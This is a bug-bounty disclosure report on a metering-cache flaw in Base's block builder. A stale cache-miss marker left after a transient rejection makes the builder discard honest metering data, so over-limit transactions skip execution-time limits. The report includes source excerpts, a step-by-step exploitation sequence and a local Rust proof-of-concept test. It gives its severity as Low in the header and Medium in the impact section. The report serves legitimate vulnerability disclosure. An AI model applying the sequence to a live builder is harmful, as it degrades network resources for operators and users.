# 76464 bc low transient metering cache poisoning allows high compute transactions to bypass builder execution limits

**Submitted on May 4th 2026 at 15:04:41 UTC by @Emmy for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76464
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

### Brief/Intro

The builder records a metering cache miss before it knows whether the transaction will actually be included. If that transaction is then rejected for a transient block-budget reason, the miss marker remains behind. When honest metering data later arrives, the builder incorrectly treats it as late data for an already-included transaction and discards it. The transaction can then be included in a later block without the execution-metering data that would have caused it to be rejected, bypassing enforced resource limits and allowing high-compute transactions through the builder.

### Vulnerability Details

The Base builder uses `MeteringStore` to cache transaction resource usage data keyed by transaction hash. Execution metering is enforced during transaction selection when `ExecutionMeteringMode::Enforce` is enabled and a transaction has cached metering data.

The vulnerable state machine is:

1. A transaction is considered by the builder.
2. The builder calls `metering_provider.get(tx_hash)`.
3. If the cache misses, `MeteringStore::get()` records `needed_at[tx_hash] = now`.
4. The builder then performs block and transaction limit checks.
5. If the transaction is rejected for a transient block-budget reason, it is not included and is not removed from the pool.
6. The stale `needed_at` marker remains.
7. When honest metering later arrives, `MeteringStore::insert()` sees `needed_at[tx_hash]` and drops the metering result.
8. The transaction can be retried in the next block with no metering data, causing execution-metering limits to be skipped.

The root cause is that `needed_at` is used as if every cache miss means the transaction was included without metering. That invariant is false. A transaction can miss metering and still be rejected before execution due to a transient limit such as current block uncompressed size, block gas, DA bytes, or DA footprint.

In `MeteringStore::get()`, every cache miss records a `needed_at` entry:

```rust
fn get(&self, tx_hash: &TxHash) -> Option<MeterBundleResponse> {
    if !self.metering_enabled.load(Ordering::Relaxed) {
        return None;
    }

    let Some(entry) = self.cache.get(tx_hash) else {
        self.needed_at.entry_by_ref(tx_hash).or_insert(Instant::now());
        return None;
    };

    Some(entry)
}
```

In `MeteringStore::insert()`, any transaction with a `needed_at` entry is treated as a late-arriving metering result and is not cached:

```rust
fn insert(&self, tx_hash: TxHash, metering: MeterBundleResponse) {
    if let Some(needed_at) = self.needed_at.remove(&tx_hash) {
        let latency_ms = needed_at.elapsed().as_millis() as f64;
        BuilderMetrics::metering_late_arrival_total().increment(1);
        BuilderMetrics::metering_late_arrival_latency_ms().record(latency_ms);
        BuilderMetrics::metering_late_arrival_execution_time_us()
            .record(metering.total_execution_time_us as f64);
        BuilderMetrics::metering_late_arrival_state_root_time_us()
            .record(metering.state_root_time_us as f64);
        return;
    }

    self.cache.insert(tx_hash, metering);
    BuilderMetrics::metering_store_size().set(self.cache.entry_count() as f64);
}
```

The builder does clear `needed_at` in the specific `MeteringDataPending` path:

```rust
self.builder_config.metering_provider.skip(&tx_hash);
best_txs.mark_invalid(tx.signer(), tx.nonce());
continue;
```

However, that cleanup is not performed for transient static rejections. For example, if the transaction exceeds the current block's remaining uncompressed-size budget, the builder only invalidates it for the current iterator:

```rust
diag.record_rejection(&err);
self.record_static_limit_exceeded(&err);

if err.is_permanent() {
    diag.permanently_rejected_txs.push(tx_hash);
}
log_txn(Err(err));
best_txs.mark_invalid(tx.signer(), tx.nonce());
continue;
```

`BlockUncompressedSizeExceeded` is not permanent. The transaction remains in the pool and can be included in a later block. Since the stale `needed_at` entry is not cleared, the first honest metering result for that transaction is discarded.

The execution-metering enforcement then fails open. The limit checks only run when metering data is present:

```rust
if let Some(tx_time) = tx.execution_time_us {
    if let Some(tx_limit) = limits.tx_execution_time_limit_us
        && tx_time > tx_limit
    {
        return Err(TransactionExecutionTime(tx_time, tx_limit).into());
    }
}
```

Therefore, once the honest metering result has been dropped, the transaction is treated as unmetered and the configured execution-time limit is skipped.

This issue does not require forged metering data, an unauthenticated RPC call, a trusted admin, or compromised infrastructure. The PoC uses the real `MeteringStore` and a normal builder flow. The attacker only needs to submit a transaction that first loses to a transient block-budget constraint, then becomes eligible in a later block after its metering result has been discarded.

## Impact Details

This is a Blockchain/DLT Medium severity issue under Immunefi v2.2: high compute consumption by validator/mining nodes.

The builder's execution metering is intended to prevent transactions with excessive predicted execution time or state-root cost from entering flashblocks when enforcement is enabled. This bug breaks that protection. A transaction with honest metering data above the configured per-transaction execution limit can still be included if it first encounters a transient rejection that leaves a stale `needed_at` marker.

The impact is resource griefing against the builder path:

* High-compute transactions can bypass `max_execution_time_per_tx_us`.
* State-root or execution-heavy transactions can be admitted without their metering data being applied.
* The builder may spend execution and state-root resources on transactions that operator policy explicitly configured it to reject.
* The attack can be repeated by arranging for expensive transactions to first be considered while a transient block budget is exhausted.

The issue does not demonstrate theft of funds, protocol insolvency, network shutdown, or a chain split. The appropriate impact is high compute consumption / protocol griefing.

## References

* [`base/crates/builder/metering/src/store.rs`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/metering/src/store.rs)
* [`base/crates/builder/core/src/flashblocks/context.rs`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/context.rs)
* [`base/crates/builder/core/src/execution.rs`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/execution.rs)

## Proof of Concept

The following test demonstrates the bug using the real `MeteringStore`.

Place this file at:

```
base/crates/builder/core/tests/metering_late_arrival.rs
```

The test also requires `base-builder-metering.workspace = true` under `[dev-dependencies]` in `base/crates/builder/core/Cargo.toml`.

```rust
#![allow(missing_docs)]

use std::{sync::Arc, time::Duration};

use alloy_primitives::{Address, B256, Bytes, TxHash, U256};
use base_builder_core::{
    BuilderConfig, ExecutionMeteringMode, MeteringProvider,
    test_utils::{BlockTransactionsExt, setup_test_instance_with_builder_config},
};
use base_builder_metering::MeteringStore;
use base_bundles::MeterBundleResponse;

fn over_limit_metering() -> MeterBundleResponse {
    MeterBundleResponse {
        bundle_hash: B256::random(),
        bundle_gas_price: U256::ZERO,
        coinbase_diff: U256::ZERO,
        eth_sent_to_coinbase: U256::ZERO,
        gas_fees: U256::ZERO,
        results: vec![],
        state_block_number: 0,
        state_flashblock_index: None,
        total_gas_used: 21_000,
        total_execution_time_us: 10_000,
        state_root_time_us: 0,
        state_root_account_leaf_count: 0,
        state_root_account_branch_count: 0,
        state_root_storage_leaf_count: 0,
        state_root_storage_branch_count: 0,
    }
}

#[tokio::test]
async fn transient_rejection_drops_late_metering_and_bypasses_enforcement() -> eyre::Result<()> {
    let metering = Arc::new(MeteringStore::new(true, 100, Duration::from_secs(30)));

    let mut config = BuilderConfig::for_tests().with_max_uncompressed_block_size(Some(100_000));
    config.execution_metering_mode = ExecutionMeteringMode::Enforce;
    config.max_execution_time_per_tx_us = Some(1_000);
    config.metering_provider = metering.clone();

    let rbuilder = setup_test_instance_with_builder_config(config).await?;
    let driver = rbuilder.driver().await?;

    let calldata = Bytes::from(vec![0u8; 50_000]);

    // Step 1: fill the first block-size window with a higher-priority transaction.
    let filler = driver
        .create_transaction()
        .with_to(Address::ZERO)
        .with_input(calldata.clone())
        .with_gas_limit(600_000)
        .with_max_priority_fee_per_gas(100)
        .send()
        .await?;

    // Step 2: submit a lower-priority transaction that is valid on its own, but cannot fit after
    // the filler. The builder will call metering.get(), record a miss, then reject it only because
    // the current block's uncompressed-size budget is exhausted.
    let victim = driver
        .create_transaction()
        .with_to(Address::ZERO)
        .with_input(calldata)
        .with_gas_limit(600_000)
        .with_max_priority_fee_per_gas(90)
        .send()
        .await?;
    let victim_hash: TxHash = *victim.tx_hash();

    let block1 = driver.build_new_block_with_current_timestamp(None).await?;
    assert!(block1.includes(filler.tx_hash()), "filler should occupy the first block");
    assert!(
        !block1.includes(&victim_hash),
        "victim should be transiently rejected by the block-size limit"
    );

    // Step 3: honest metering arrives after the transient rejection. Because the prior miss left a
    // needed_at entry, MeteringStore::insert treats this as late data for an already-included tx and
    // drops it instead of caching it for the next block.
    metering.insert(victim_hash, over_limit_metering());
    assert!(
        metering.get(&victim_hash).is_none(),
        "late metering for a non-included transaction was discarded"
    );

    // Step 4: the same transaction is considered in the next block with no cached metering data.
    // It exceeds the configured per-tx execution-time limit, but that limit is skipped when the
    // prediction is missing, so the builder includes it.
    let block2 = driver.build_new_block_with_current_timestamp(None).await?;
    assert!(
        block2.includes(&victim_hash),
        "over-limit transaction was included after its metering result was dropped"
    );

    Ok(())
}
```

Run the PoC:

```bash
RUSTFLAGS='' cargo test -p base-builder-core transient_rejection_drops_late_metering_and_bypasses_enforcement
```

Expected result:

```
test transient_rejection_drops_late_metering_and_bypasses_enforcement ... ok
```
